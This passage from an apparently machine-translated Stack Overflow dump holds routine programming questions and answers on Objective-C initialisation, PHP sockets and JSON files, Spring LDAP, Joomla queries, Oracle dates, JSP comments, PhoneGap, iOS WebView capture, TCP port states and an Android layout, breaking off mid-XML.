## 回答 #1

> 赞同：6
> 
> 时间：2013-04-24T05:36:48.013

init 方法中的代码是特定于类的——它执行该特定类所需的任何初始化。在某些情况下，类不需要执行任何初始化，因此删除此方法调用将无效。

但是，按照惯例，您应该始终使用 init - 如果将来有人要向类添加一些必需的初始化代码怎么办？

也可以看看：

[alloc 和 init 他们实际上做了什么](https://stackoverflow.com/questions/3848990/alloc-and-init-what-do-they-actually-do)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-24T05:44:46.067

为了解决“一切正常”的问题，关于 Objective-C 的有趣之处在于 alloc 将所有实例变量设置为 nil，并且向 nil 发送消息不会做任何事情，它只是返回 nil，所以在大多数情况下，你在您尝试做非法的事情之前不会看到问题，考虑这样的课程

```
@interface MyObject : NSObject
@property (nonatomic, strong) NSString *string;
@end

@implementation MyObject
@end 
```

现在，如果我们将其分配为：

```
MyObject *m = [MyObject alloc]; 
```

实例变量`_string`或属性`string`将为 nil，我们可以向它发送不同的消息，就像`[string length]`没有任何伤害一样，因为给 nil 的消息等于 nil。

但是假设我们想把这个字符串添加到数组中，比如

```
@[m.string] 
```

现在你会得到一个例外，因为 NSArray 不能包含`nil`，只能包含完整的对象。您可以通过在 MyObject.init 中初始化您的值来轻松解决此问题。

相当人为的例子，但希望能说明为什么当你不初始化时一切都不会中断:)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-24T06:29:29.297

`alloc`永远不要直接使用 ' 返回值而不是使用' 返回值的主要原因之一`[[Class alloc] init]`是它`init`可能返回与`alloc`.

苹果的文档提到了这一点：

> **注意：** init 可能返回与 alloc 创建的对象不同的对象，因此最好按所示嵌套调用。切勿在未重新分配指向该对象的任何指针的情况下初始化对象。例如，不要这样做：
> 
> ```
> NSObject *someObject = [NSObject alloc];
> [someObject init]; 
> ```
> 
> 如果对 init 的调用返回一些其他对象，您将得到一个指向最初分配但从未初始化的对象的指针。

来源：http: [//developer.apple.com/library/ios/#documentation/cocoa/conceptual/ProgrammingWithObjectiveC/WorkingwithObjects/WorkingwithObjects.html](http://developer.apple.com/library/ios/#documentation/cocoa/conceptual/ProgrammingWithObjectiveC/WorkingwithObjects/WorkingwithObjects.html)

# php - get UDP Multicast stream in PHP

> ID：16184041
> 
> 赞同：4
> 
> 时间：2013-04-24T05:29:32.417
> 
> 标签：php, udp, video-streaming, multicast

I am trying to receive a UDP multicast stream in PHP. The receive command never gets anything and waits forever.

I can watch the stream using VLC player so the stream is accessible on my machine. Any help on how to do this using PHP is highly appreciated.

Here is my code.

```
<?php
error_reporting(E_ALL | E_STRICT); 
```

//create a new socket

```
$socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP); 
```

//i am not sure about this command. I think i have to set this option to start receiving packets.

```
socket_set_option($socket, SOL_SOCKET, MCAST_JOIN_SOURCE_GROUP, array("group"=>"239.194.0.73","interface"=>"eth0","source"=>"239.194.0.73"));
$binded = socket_bind($socket, '127.0.0.1', 6073); 
```

//receive data

```
$from = '';
$port = 0;
socket_recvfrom($socket, $buf, 12, MSG_WAITALL, $from, $port);
echo "Received $buf from remote address $from and remote port $port" . PHP_EOL;
?> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-24T05:32:01.013

```
$binded = socket_bind($socket, '127.0.0.1', 6073); 
```

Should be

```
$binded = socket_bind($socket, '0.0.0.0', 6073); 
```

Or else you will only recv packets originating from the local host.

# php - how to add item to the json file formatted array

> ID：16184047
> 
> 赞同：15
> 
> 时间：2013-04-24T05:30:36.313
> 
> 标签：php, json, file, post

I am using using just 1 data to insert in my json file.

```
$data=$_POST['myusernamer'];

$inp = file_get_contents('7players.json');
$tempArray = json_decode($inp);
array_push($tempArray, $data);
$jsonData = json_encode($tempArray);
file_put_contents('7players.json', $jsonData); 
```

So this is how my json file looks. I just want to add 1 player at the end.

```
{ 

"players":[
   {

        "name":"Moldova",
        "image":"/Images/Moldova.jpg",
        "roll_over_image":"tank.jpg"
   },
   {

        "name":"Georgia",
        "image":"/Images/georgia.gif",
        "roll_over_image":"tank.jpg"
   },
   {

        "name":"Belarus",
        "image":"/Images/Belarus.gif",
        "roll_over_image":"tank.jpg" 
   },
   {

        "name":"Armenia",
        "image":"/Images/armenia.png",
        "roll_over_image":"tank.jpg"
   },
   {

        "name":"Kazahstan",
        "image":"/Images/kazahstan.gif",
        "roll_over_image":"tank.jpg"
   },
   {

        "name":"Russia",
        "image":"/Images/russia.gif",
        "roll_over_image":"tank.jpg"
   },
  ],

"games" : [ 

    { 

    "matches" : [ 

            {

            "player1id":"*",
            "player2id":"*",
            "winner":"*"
            },

            {
            "player1id":"*",
            "player2id":"*",
            "winner":"*"
            },

            {
            "player1id":"*",
            "player2id":"*",
            "winner":"*"
            },

            {
            "player1id":"*",
            "player2id":7,
            "winner":"*"
            },

            {
            "player1id":"*",
            "player2id":"*",
            "winner":"*"
            },

            {
            "player1id":"*",
            "player2id":"*",
            "winner":"*"
            },

            {
            "player1id":"*",
            "player2id":"*",
            "winner":"*"
            }
        ]
       },

    {

    "matches" : [

            {
            "player1id":"*",
            "player2id":"*",
            "winner":"*"
            },
            {
            "player1id":"*",
            "player2id":"*",
            "winner":"*"
            },
            {
            "player1id":"*",
            "player2id":"*",
            "winner":"*"
            },
            {
            "player1id":"*",
            "player2id":7,
            "winner":"*"
            },
            {           
            "player1id":"*",
            "player2id":"*",
            "winner":"*"
            },
            {
            "player1id":"*",
            "player2id":"*",
            "winner":"*"
            },
            {
            "player1id":"*",
            "player2id":"*",
            "winner":"*"
            },

      ]
    }
  ] 
} 
```

My question is, how do I add player at the end? And I would also like to know how to update

```
player1id":"*",
"player2id":"*",
"winner":" 
```

in the match array.

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-04-24T05:32:53.117

只需解码您的 json 字符串，然后使用数组推送

```
$tempArray = json_decode($jsonstring, true);
array_push($tempArray, $your_data); 
```

对于您的情况

```
 $str = '{ 

"players":[
   {

        "name":"Moldova",
        "image":"/Images/Moldova.jpg",
        "roll_over_image":"tank.jpg"
   },
   {

        "name":"Georgia",
        "image":"/Images/georgia.gif",
        "roll_over_image":"tank.jpg"
   } ]}';

 $arr = json_decode($str, true);
 $arrne['name'] = "dsds";
 array_push( $arr['players'], $arrne );
 print_r($arr); 
```

只需检查 print_r($arr); 的值 我希望这是你想要的。:)

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-04-24T05:35:32.117

添加其他玩家

```
$tempArray = json_decode($inp, true);
array_push($tempArray['players'], array('name' => $data['username'], 'image' => $data['userimage'], 'roll_over_image' => 'tank.jpg')); 
```

更新比赛

第一个匹配数组

```
$tempArray['games'][0]['matches']; 
```

第二个匹配数组

```
$tempArray['games'][1]['matches']; 
```

现在是带有键的简单二维数组`player1id`，`player2id`并且`winner`- 应该很容易更新这些。之后，您可以将`$tempArray`回编码为 json。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2016-08-23T01:51:52.030

```
<html>
<head>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
    <script type="text/javascript" src="http://code.jquery.com/jquery-1.4.3.min.js" ></script>
</head>
<body>
    <?php
       //first copy your json data  data.json
        $str = file_get_contents('data.json');//get contents of your json file and store it in a string,bro small suggestion never keep any JSON data in ur html file its not safe.always keep json data in external file.
        $arr = json_decode($str, true);//decode it
         $arrne['players'] = "sadaadad";
         $arrne['image'] = "sadaadad";
         $arrne['roll_over_image'] = "sadaadad";
         array_push( $arr['employees'], $arrne);//push contents to ur decoded array i.e $arr
         $str = json_encode($arr);
        //now send evrything to ur data.json file using folowing code
         if (json_decode($str) != null)
           {
             $file = fopen('data.json','w');
             fwrite($file, $str);
             fclose($file);
           }
           else
           {
             //  invalid JSON, handle the error 
           }

        ?>
</body> 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2019-10-30T10:10:20.597

> 在核心 PHP 中

如果您想要 JSON 响应上的数组。那么您可以使用此代码。

很简单的方法，你可以使用这些步骤。

**1) 步骤您必须使用json_decode()**将 JSON 转换为数组。

2) 使用 array_merge() 方法添加新数组。如果您有兴趣添加一个数组。

```
$staff =  json_decode($staffRes ,true);
$driver = ["helpers"=>[id=>1,name=>hep1],[id=>2,name=>hep2]]
$profile= array_merge($staff ,$driver ); 
```

> 在 Laravel 中

```
$staff =  collect($staffRes)->toArray() ; // json() also work here.
$driver = ["helpers"=>[id=>1,name=>hep1],[id=>2,name=>hep2]]
$profile= array_merge($staff ,$driver ); 
```

> 输出

```
{
    "error": 0,
    "errmsg": "",
    "response": {
        "id": "NlF4VDMrdEoxM2RCUWkxUE92c29tZz09",
        "type": "DRIVER",
        "driver_name": "Ravi Kumar",     
        "route_name": "Barasat Dak Bungalow",
        "helpers": [
            {
                "helper_id": "K09NTlpHMStiNGlKSGZNMUIyWlAxZz09",
                "helper_name": "Arvind Kumar",
                "helper_mobile": "7777777775",
                "helper_alt_mobile": "7777777777",
                "birth_date": "01-10-2000",
                "address": "Bongaon",
                "id_proof": "123456789-WB",
                "licence_no": null,
                "experience": "2-year",
                "helper_photo":""
            },
            {
                "helper_id": "K29la21vY0VnMTZ5cFY2MU02cm1ZUT09",
                "helper_name": "SUBIR DAS",
                "helper_mobile": "5555555555",
                "helper_alt_mobile": "5555555554",
                "birth_date": "30-10-2019",
                "address": "610/8, ....",
                "id_proof": "NA",
                "licence_no": "NA",
                "experience": "2 years",
                "helper_photo": ""
            }
        ]
    }
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-06-24T07:16:32.250

使用这个 php 代码

```
 <?php  
 $message = '';  
 $error = '';  
 if(isset($_POST["submit"]))  
 {  
      if(empty($_POST["title"]))  
      {  
           $error = "<label class='text-danger'>Enter details</label>";  
      }  
      else if(empty($_POST["image"]))  
      {  
           $error = "<label class='text-danger'>Enter Posted By</label>";  
      }  
      else  
      {  
           if(file_exists('myfile.json'))  
           {  
                $current_data = file_get_contents('myfile.json');  
                $array_data = json_decode($current_data, true);  
                $extra = array(  
                     'title'               =>     $_POST['title'],  
                     'image'          =>     $_POST["image"],  
                );  
                $array_data[] = $extra;  
                $products['products']=$array_data[];
                $final_data = json_encode($products);  
                if(file_put_contents('myfile.json', $final_data))  
                {  
                     $message = "<label class='text-success'>Added Successfully</p>";  
                }  
           }  
           else  
           {  
                $error = 'JSON File not exits';  
           }  
      }  
 }  
 ?> 
```

# spring - 如何使用带有 LDAP 的 Spring Security 获取用户信息

> ID：16184049
> 
> 赞同：0
> 
> 时间：2013-04-24T05:30:39.273
> 
> 标签：spring, authentication, spring-security, ldap

我将 Spring 3.1.1 与 Spring Security 3.2.0 与 LDAP 身份验证一起使用。我已经达到了可以正常工作的程度，我可以使用我的 LDAP 用户名和密码登录，我什至可以用这个显示用户名

```
<security:authentication property="principal.username" />, is currently logged in. 
```

如果可能的话，我想知道如何获取名字、姓氏、电子邮件地址或存储在我的 LDAP 凭据中的其他信息。

我试过`property="credentials"`了，但这返回null ...

请帮忙！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T06:40:39.427

实现您自己的 UserDetailsContextMapper 并将 LDAP 用户属性加载到 UserDetails 对象中

[http://docs.spring.io/spring-security/site/docs/3.2.x/reference/htmlsingle/#ldap-custom-user-details](http://docs.spring.io/spring-security/site/docs/3.2.x/reference/htmlsingle/#ldap-custom-user-details)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-24T18:12:24.263

这与我几天前的问题非常相似：

[如何将自定义权限填充器与 Spring Security 和 ActiveDirectoryLdapAuthenticationProvider 一起使用？](https://stackoverflow.com/questions/16113115/how-do-i-use-a-custom-authorities-populator-with-spring-security-and-the-actived)

如果您不使用 Active Directory，您可以简单地扩展`LdapAuthenticationProvider`该类并覆盖该`loadUserAuthorities`方法，您可以在其中根据用户的 LDAP 属性捕获相关的用户信息：

```
String firstName = userData.getStringAttribute("givenName");
String lastName = userData.getStringAttribute("sn");

//etc. 
```

您可以将这些存储在您喜欢的任何位置或任何位置，并且您仅限于通过 LDAP 提供的属性。然后，您必须在适当的 bean 中指定您的 LdapAuthoritiesProvider（如果有记忆，则为 ldapAuthoritiesPopulator）。

我*相信*以上内容适用于非 AD LDAP，但您显然需要对其进行测试才能确定。如果您还没有使用它，我推荐[Apache Studios 提供的 Eclipse LDAP 浏览器。](http://directory.apache.org/studio/)

# javascript - 谷歌应用引擎：同步所有服务器的时间和客户端的 javascript 计时器

> ID：16184051
> 
> 赞同：0
> 
> 时间：2013-04-24T05:30:51.963
> 
> 标签：javascript, google-app-engine

我正在使用 Python 在 Google App Engine 上开发出价系统。产品在预定时间开放投标，投标持续 3 分钟。产品的价格在 3 分钟内每秒下降一个恒定值，直到它为零。最先按下“投标”按钮的投标人中标。此应用程序中的一个关键问题是所有用户之间的时间应该完美同步，以便每个人同时看到相同的价格。以下是我迄今为止提出的，但它受到不准确的计时器的影响。

当用户访问或刷新页面时，Python 代码会将服务器时间传递给 javascript 计时器，计时器开始倒计时。简化的javascript如下：

```
var count = {{timeToBid}};  // 'timeToBid' is in seconds and is inserted by the template engine
var price =={{initialPrice}}  // The initial product price
var currentPrice;             // Current price

function updateTime() {
  timeStr = ...;    // Set the time string to be HH:MM:SS
  $("#timeToBid").html(timeStr);   // Display time in the 'timeToBid' div
  if (count <= 180) {    // Start bidding
    currentPrice =  ...;  // Calculate the current price  
    $("#currentPrice").html(currentPrice);  // Update current price
  }
  count--;
  setTimeout(updateTime, 1000);  // Executed every second
}

updateTime(); 
```

上面的 javascript 受到用户浏览器之间不同步的计时器以及不同步的服务器时间的严重影响（请参阅[this](https://stackoverflow.com/questions/4019514/keeping-track-of-time-with-1-second-accuracy-in-google-app-engine)）。每个浏览器中显示的当前价格可能在很大范围内变化，这使得系统完全无法使用。这是一个相当复杂的问题，我正在寻求好的解决方案。一到两秒的时间误差是可以接受的。我的问题：

(a) 为了使 javascript 计时器更准确，我计划使用 AJAX 每 10 秒检索一次服务器时间，然后更新“计数”。这是一个好的解决方案吗？还是有其他选择？

```
$.ajax({
   url: "/getServerTime",
   cache: false,
   success: function(serverCount) {
     count = parseInt(serverCount);
     return false;
   }
}); 
```

(b) 我完全不知道如何解决服务器时间不一致的问题。有人可以帮忙吗？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T06:10:22.250

App Engine 服务器上的系统时钟保持同步：请参阅[此权威答案](https://stackoverflow.com/a/2591931/248432)。

每个 App Engine HTTP 响应都有一个`Date`标头，如下所示`Date: Wed, 24 Apr 2013 06:03:37 GMT`。您可以使用它来将浏览器与服务器时间同步。

# php - Fetch data from database issue

> ID：16184061
> 
> 赞同：1
> 
> 时间：2013-04-24T05:31:50.757
> 
> 标签：php, components, joomla2.5, wampserver

i have one issue i make a component and i add data add component data table that i want to fetch that data in my site how to do and i have one other issue how to put query in `view.html.php` file in components i have code i add my code i have one error i add my error

```
500 - View class not found [class, file]: team_memberViewteam_member, C:\wamp\www\Joomla_2.5.8-Stable-Full_Package\components\com_team_member\views\team_member\view.html.php 
```

this is my code please help me how to fetch data in database....

```
// import Joomla view library
jimport('joomla.application.component.view');

/**
 * HTML View class for the HelloWorld Component
 */
class HelloWorldViewHelloWorld extends JView
{
        // Overwriting JView display method
        function display($tpl = null) 
        {
                // Assign data to the view
                 $db = JFactory::getDbo();

// Create a new query object.
                $query = $db->getQuery(true);

// Select all records from the user profile table where key begins with "custom.".
// Order it by the ordering field.
            $query->select(array('id', 'member_name', 'member_pic', 'member_des','member_description'));
            $query->from('#__gztqw_team_member_datadetails');
            $query->where('profile_key LIKE \'custom.%\'');
            $query->order('ordering ASC');

// Reset the query using our newly populated query object.
            $db->setQuery($query);

// Load the results as a list of stdClass objects.
            $results = $db->loadObjectList();

                // Display the view
                parent::display($tpl);
        }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T05:36:26.383

尝试简单的方法：-

```
$db = JFactory::getDbo();
$query = 'SELECT data FROM #__gztqw_team_member_datadetails WHERE profile_key LIKE "custom.%" order by ASC';
$db->setQuery($query);
$results = $db->loadObjectList(); 
```

此外，您还没有在函数中恢复任何值，并且在哪里显示它是在视图中显示数据的最佳方式，使用控制器功能并分配结果值以在视图中显示

你需要阅读[http://docs.joomla.org/Developing_a_Model-View-Controller_%28MVC%29_Component_for_Joomla!2.5](http://docs.joomla.org/Developing_a_Model-View-Controller_%28MVC%29_Component_for_Joomla!2.5)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-26T15:35:11.790

首先，您视图中的类称为HelloWorldViewHelloWorld，它应该称为Team_memberViewTeam_member，这就是导致您的错误的原因。

其次，理想情况下，您应该将数据库查询放入您的模型中，但是如果您将其放入您的视图中，它仍然可以工作。我已经为您提供了一个示例，说明如何使其与视图中的查询一起使用。我创建了一个名为 $items 的受保护变量，并将数据库中的结果分配给该变量。

在您的模板中，您将使用以下方式访问数据库中的数据

```
foreach($this->items as $item):
       echo $item->id;
endforeach(); 
```

在你看来你应该有

```
class Team_memberViewTeam_member extends JView
{
    protected $items;

    // Overwriting JView display method
    public function display($tpl = null) 
    {
         $db = JFactory::getDbo();

           // Create a new query object.
            $query = $db->getQuery(true);

     // Select all records from the user profile table where key begins with "custom.".
// Order it by the ordering field.
        $query->select(array('id', 'member_name', 'member_pic','member_des','member_description'));
        $query->from('#__gztqw_team_member_datadetails');
        $query->where('profile_key LIKE \'custom.%\'');
        $query->order('ordering ASC');

  // Reset the query using our newly populated query object.
        $db->setQuery($query);

// Load the results as a list of stdClass objects.
        $this->items = $db->loadObjectList(); 
         parent::display($tpl);
    }
} 
```

# sql - SQL date filter

> ID：16184064
> 
> 赞同：-3
> 
> 时间：2013-04-24T05:32:05.887
> 
> 标签：sql, oracle, datetime, timestamp

I ran this following query and somehow I feel the results are wrong.

```
SQL> select to_char(starttime,'dd-mm-YYYY hh24:mi:ss') 
from report 
where dateofmonth between 
    to_timestamp_tz('22-Apr-2013 12:00:00','dd-mm-YYYY hh24:mi:ss') 
    and to_timestamp_tz ('23-Apr-2013 14:00:00','dd-mm-YYYY hh24:mi:ss');

TO_CHAR(STARTTIME,
--------------------
23-04-2013 22:43:59
23-04-2013 13:43:37

SQL> select to_timestamp_tz(starttime,'dd-mm-YYYY hh24:mi:ss') 
from report 
where dateofmonth between 
    to_timestamp_tz('22-Apr-2013 12:00:00','dd-mm-YYYY hh24:mi:ss') 
    and to_timestamp_tz ('23-Apr-2013 14:00:00','dd-mm-YYYY hh24:mi:ss');

TO_TIMESTAMP_TZ(STARTTIME,'DD-MM-YYYYHH24:MI:SS')
-------------------------------------------------
23-APR-13 10.43.59 PM -07:00
23-APR-13 01.43.37 PM -07:00 
```

I am not sure why the 10 PM time is coming up in the result.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T05:51:58.140

曼吉特，

您正在选择 starttime 列，但 where 子句具有 dateofmonth 列。在查询中同时选择 starttime 和 dateofmonth 并检查它是否给出了正确的结果。

# html - JSP comment is called hide comment whereas html comment is called output comment

> ID：16184065
> 
> 赞同：7
> 
> 时间：2013-04-24T05:32:11.640
> 
> 标签：html, jsp

I'm preparing for an interview so while reading some questions I found that the "JSP comment is called hide comment whereas html comment is called output comment". And the answer says that if we try to view source in JSP, the comments will not be shown whereas in HTML, it will be shown.

But I'm able to see the comment in the view source section. Can anybody clear this doubt?

Thanks in advance.

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-04-24T05:41:33.517

JSP 中允许使用两种类型的注释。这些是隐藏和输出评论。隐藏的注释不会出现在 html 的生成输出中，而输出注释会出现在生成的输出中。

隐藏评论示例：

```
<%-- This is hidden comment --%> 
```

输出注释示例：

```
<!-- This is output comment --> 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-24T05:47:55.073

好吧，从技术上讲，如果您使用典型的 JSP 注释，例如

```
<%-- This is a comment --%> 
```

, 并做一个 veiw 源代码, 你不会在客户端看到它, 如果你做一个 HTML 样式的评论

```
<!-- This is a comment --> 
```

，您可以查看查看源代码并在客户端查看。不用说，您也可以像普通的 java 风格一样在 jsp 标签内进行评论。希望能帮助到你 。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-04-27T15:05:03.123

Html 注释不会阻止 jsp 评估值

```
<!-- <%! int x = 0; %> --> 
```

这一行将声明 x 变量。

# javascript - How can I use Javascript to perform background updates of a Phonegap application?

> ID：16184066
> 
> 赞同：1
> 
> 时间：2013-04-24T05:32:14.507
> 
> 标签：javascript, html, cordova, silent-installer

I am using PhoneGap to develop an application for Android and iOS, and recently in a discussion about this technology, someone told me a seemingly brilliant idea that I can do background updates of my application without having to submit a new application to the app store.

The problem is that, being that I am still fairly new to the HTML5/CSS and Javascript world, I cannot figure out how to download files to my www directory for permanent storage. I can dynamically load JS code or HTML pages at runtime, but I want to create some javascript module that will find that a certain .css, .html, or .js file is out of date, download the new version of that file from some http or file server to the www directory, and then have that new file permanently saved so that it is available the next time the app is opened.

I feel like this should be simple, but I can't figure out how to do it. Thanks in advance.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T05:34:45.037

为了将文件永久保存到设备，您需要使用[PhoneGap 文件 API](http://docs.phonegap.com/en/2.6.0/cordova_file_file.md.html#File)。周期性任务可以通过一个简单的 Javascript 计时器来完成。

# iphone - Printing and saving a web page Using iPhone

> ID：16184067
> 
> 赞同：0
> 
> 时间：2013-04-24T05:32:18.663
> 
> 标签：iphone, ios, objective-c, ios5, ios4

I want my WebView to save as image or pdf of any formate,

I tried with saving the web page using the code :

```
 UIGraphicsBeginImageContext(WebPage.frame.size);
   [WebPage.layer renderInContext:UIGraphicsGetCurrentContext()];
   UIImage *viewImage = UIGraphicsGetImageFromCurrentImageContext();
   UIGraphicsEndImageContext();
   UIImageWriteToSavedPhotosAlbum(viewImage, nil, nil, nil); 
```

but i'm getting the part which is visible..

i want to know how to get the entire web page image or how the apple people giving the air print so that the entire web page can b printed.. i dont want to know the "AirPrint function" i want to know how to get web page image using the iPhone..

As i'm fresher to iOS development.

can any one help me with he working code of saving web page?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T06:39:04.947

```
- (void)printAndSave
{
    webViewHeight = [[self.myWebView stringByEvaluatingJavaScriptFromString:@"document.body.scrollHeight;"] integerValue];
    CGRect screenRect = self.myWebView.frame;
    double currentWebViewHeight = webViewHeight;
    while (currentWebViewHeight > 0)
    {
        imageName ++;
        UIGraphicsBeginImageContext(screenRect.size);
        CGContextRef ctx = UIGraphicsGetCurrentContext();
        [[UIColor blackColor] set];
        CGContextFillRect(ctx, screenRect);
        [self.myWebView.layer renderInContext:ctx];
        UIImage *newImage = UIGraphicsGetImageFromCurrentImageContext();
        UIGraphicsEndImageContext();
        NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
        NSString *documentsDirectory = [paths objectAtIndex:0];
        NSString *pngPath = [documentsDirectory stringByAppendingPathComponent:[NSString stringWithFormat:@"%d.png",imageName]];
        if(currentWebViewHeight < 460)
        {
            CGRect lastImageRect = CGRectMake(0, 457 - currentWebViewHeight, self.myWebView.frame.size.width, currentWebViewHeight);
            CGImageRef lastImageRef = CGImageCreateWithImageInRect([newImage CGImage], lastImageRect);
            newImage = [UIImage imageWithCGImage:lastImageRef];
            CGImageRelease(lastImageRef);
        }
        [UIImagePNGRepresentation(newImage) writeToFile:pngPath atomically:YES];
        [self.myWebView stringByEvaluatingJavaScriptFromString:@"window.scrollBy(0,460);"];
        currentWebViewHeight -= 460;
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-24T05:40:35.247

```
- (IBAction)printSaveTheWebView:(id)sender
{
    UIImage *viewImage;
    UIScrollView *Scroll_view = webView.scrollView;
    CGRect savedFrame;
    UIGraphicsBeginImageContext(Scroll_view.contentSize);
    {
        CGPoint savedContentOffset = Scroll_view.contentOffset;
        savedFrame = Scroll_view.frame;
        Scroll_view.contentOffset = CGPointZero;
        Scroll_view.frame = CGRectMake(0, 0, Scroll_view.contentSize.width, Scroll_view.contentSize.height);
        [Scroll_view.layer renderInContext: UIGraphicsGetCurrentContext()];
        viewImage = UIGraphicsGetImageFromCurrentImageContext();
        Scroll_view.contentOffset = savedContentOffset;
        Scroll_view.frame = savedFrame;
    }
    UIGraphicsEndImageContext();
    UIImageWriteToSavedPhotosAlbum(viewImage, self, nil, nil);
    [UIImagePNGRepresentation(viewImage) writeToFile:[NSHomeDirectory() stringByAppendingPathComponent:@"view.png"] atomically:YES];    
} 
```

**单击按钮时调用此方法**

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-24T05:36:24.600

为了获得您的要求，您必须通过更改框架来更改`context`of `webview`，为此需要一个 for 循环并通过更改上下文根据页数循环它。

[一旦检查这个](http://coderchrismills.wordpress.com/2011/06/25/making-a-pdf-from-a-uiwebview/)

# vb.net - 应用程序的 TCP 端口状态检查。

> ID：16184075
> 
> 赞同：1
> 
> 时间：2013-04-24T05:33:08.887
> 
> 标签：vb.net, tcp, chat, port, netstat

我在 vb.net 开发了聊天应用程序。它用于在办公室内连接在 LAN 网络中的 PC 之间聊天。它使用 TCP/IP 端口 25025 连接到另一个。该应用程序运行良好。但在某些情况下，接收者不会收到聊天消息。

所以我只是`netstat -an`在那台电脑上运行命令并找到这么多 tcp 端口及其状态。下面是它的一部分（错误案例）。我只显示了其中包含 25025 的行。

```
Proto  Local Address          Foreign Address        State
TCP    0.0.0.0:25025          0.0.0.0:0              LISTENING
TCP    192.168.1.79:25025     192.168.1.60:1320      TIME_WAIT
TCP    192.168.1.79:25025     192.168.1.60:1321      TIME_WAIT
TCP    192.168.1.79:58508     192.168.1.60:25025     TIME_WAIT
TCP    192.168.1.79:58509     192.168.1.60:25025     TIME_WAIT
TCP    192.168.1.79:58510     192.168.1.60:25025     TIME_WAIT
TCP    192.168.1.79:58511     192.168.1.60:25025     ESTABLISHED 
```

然后我检查了相同的命令，我的应用程序没有出现任何错误（我的应用程序正常工作）。输出是，

```
TCP    192.168.1.60:25025     192.168.1.79:58511     ESTABLISHED 
```

那么我该如何解决呢？这么多带有 25025 的端口表示什么。在错误情况下，我有很多 25025 端口，如上所示。所以请帮助我理解这一点并解决问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-13T14:49:31.620

检查 bind() 调用是否成功。我的猜测是，当您的应用程序绑定到侦听端口时，它会失败并显示错误“地址已在使用中”。netstat 输出中的 TIME_WAIT 行表明确实如此。但我猜你的应用程序没有检查 bind() 的返回值，并且假设调用成功，盲目地继续。这可以解释为什么它从来没有收到任何东西。

如果套接字尚未从应用程序的先前调用完成其关闭，您将获得“地址已在使用中”。通常，套接字在被应用程序关闭后准备好重新使用大约需要 4 分钟，同时状态为 TIME_WAIT。

您可以使用 SO_REUSEADDR 套接字选项来避免此 TIME_WAIT 周期。

# android - 如何使用兼容所有屏幕尺寸的多个按钮创建相对布局？

> ID：16184082
> 
> 赞同：0
> 
> 时间：2013-04-24T05:33:31.427
> 
> 标签：android, android-layout

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:id="@+id/lyt_parent"
android:layout_width="match_parent"
android:layout_height="match_parent"
android:background="@drawable/plain_bg"
android:orientation="vertical" >

<LinearLayout
    android:id="@+id/lyt_header"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:orientation="vertical" >

    <include
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        layout="@layout/header" />
</LinearLayout>

<LinearLayout
    android:id="@+id/lyt_body"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical" >

    <RelativeLayout
        android:id="@+id/lyt_Buttons"
        android:layout_width="match_parent"
        android:layout_height="match_parent" >

        <ImageView
            android:id="@+id/imgfrontlogo"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_alignLeft="@+id/imgcenterlogo"
            android:layout_alignParentTop="true"
            android:layout_marginTop="61dp"
             android:background="@drawable/front_logo"
             />

        <ImageView
            android:id="@+id/imgcenterlogo"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_alignBottom="@+id/btnPersonaltrainer"
            android:layout_centerHorizontal="true"
            android:layout_marginBottom="29dp"
            android:background="@drawable/center_logo" />

        <Button
            android:id="@+id/btnMyProfile"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_alignParentBottom="true"
            android:layout_alignParentLeft="true"
            android:layout_marginBottom="21dp"
            android:layout_marginLeft="32dp"
            android:background="@drawable/myprofile" />

        <Button
            android:id="@+id/btnTaracker"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_alignBottom="@+id/imgcenterlogo"
            android:layout_alignParentRight="true"
            android:layout_marginBottom="49dp"
            android:background="@drawable/track" />

        <Button
            android:id="@+id/btnPersonaltrainer"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_alignBottom="@+id/btnMyProfile"
            android:layout_alignLeft="@+id/btnAllExercises"
            android:background="@drawable/personaltrainer" />

        <Button
            android:id="@+id/btnRandomworkouts"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_above="@+id/btnPersonaltrainer"
            android:layout_alignParentLeft="true"
            android:background="@drawable/randomworkout" />

        <Button
            android:id="@+id/btnAllworkouts"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_alignBaseline="@+id/btnAllExercises"
            android:layout_alignBottom="@+id/btnAllExercises"
